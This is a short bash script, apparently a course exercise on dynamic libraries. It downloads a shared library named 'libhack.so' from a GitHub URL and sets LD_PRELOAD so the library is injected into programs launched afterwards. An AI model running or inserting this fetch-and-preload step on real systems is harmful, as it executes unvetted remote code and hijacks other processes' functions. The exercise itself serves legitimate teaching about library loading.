#!/bin/bash
wget -P  .. https://raw.githubusercontent.com/Petuniapet/alx-low_level_programming/0x18-dynamic_libraries/libhack.so
export LD_PRELOAD="$PWD/../libhack.so"
